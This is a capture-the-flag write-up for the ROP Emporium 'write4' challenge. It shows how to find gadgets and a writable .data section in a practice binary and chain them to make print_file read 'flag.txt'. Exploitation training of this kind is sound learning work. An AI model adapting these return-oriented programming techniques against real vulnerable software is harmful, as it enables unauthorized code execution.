# write4 challenge

https://ropemporium.com/challenge/write4.html

## Blind test

We really sought to understand it without any help other than that provided... But it was hard !

> wget https://ropemporium.com/binary/write4.zip <br>
> unzip write4.zip <br>
> checksec write4 <br>
> strings write4 <br>

Nothing really relevant from thoses commands, there is literally no strings to exploit on this. Going to **gdb** must necessarily provide us with more information:

> gdb write4 <br>
> info func <br>

There is our pwnme being dynamically linked through *PLT* mechanism as we digged into on previous *callme* challenge. It means that getting assembly code from `disas` both **pwnme@plt** and new **print_file@plt** would just show us thoses assembly instructions from *.plt* section that is in charge to resolve the symbol onto *.got.plt*. 

There is also the **usefulFunction** with its **print_file@plt** call; the only argument get load to %rdi register from *0x4006b4*.
> x/s 0x4006b4 <br>
> 0x4006b4: "nonexistent"

In fact, we shall haved use the:
> rabin2 -z write4  

Rabin2 can also give us much more information than gdb about sections:
> rabin2 -S write4 <br>

We can locate our last argument for **print_file@plt** onto the *.rodata*, that have read-only permission. As suggested on the challenge, we shall rather use the *.data* section that is have read and write permissions.
> rabin2 -S write4 <br>
> [Sections] <br>
> <br>
> nth paddr        size vaddr       vsize perm type        name <br>
> ――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― <br>
> 23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data

## Inspecteur gadget

On other side, we have the usefulGadgets, that is nothing more than some instructions for `mov` instruction that take whatever is in %r15 to the location from %r14:
> 0x0000000000400628 <+0>:&emsp;mov %r15,(%r14)

This would be our ROP gadget, but not the only one ! As for *callme* challenge, we need some gadget to pop values from stack to thoses specifics registers. Using ropper we identified exactly what we need:
> ropper --file write4 --search "pop" <br>
> 0x0000000000400690:&emsp;pop r14; pop r15; ret;
> 0x0000000000400693:&emsp;pop rdi; ret;

We also identified one gadget to pop stack element to %rdi register, that will be our way to call **print_file@plt**, as we did with *callme* challenge.


## The solution

We will use the exact same solution as from *callme* challenge, namely by using different files generated with binject:
1. To overflow (it is still the same as for *callme* challenge):
> binject -of ovf.bin -ns 40 A

2. To get r14 and r15 values from stack with `pop` gadget:
> binject -of flg.bin -x64 400690 -x64 601028 -s flag.txt

3. To write content from r15 to r14 location with `mov` gadget:
> binject -of mem.bin -if flg.bin -x64 400628

4. To load parameter from memory on rdi:
> binject -of prm.bin -x64 400693 -x64 601028

5. To call the function:
> binject -of cll.bin -if prm.bin -x64 400510

6. Put it all together:
> binject -of ola.bin -if ovf.bin -if mem.bin -if cll.bin

Here we go:

> Thank you! <br>
> ROPE{a_placeholder_32byte_flag!} <br>
> Segmentation fault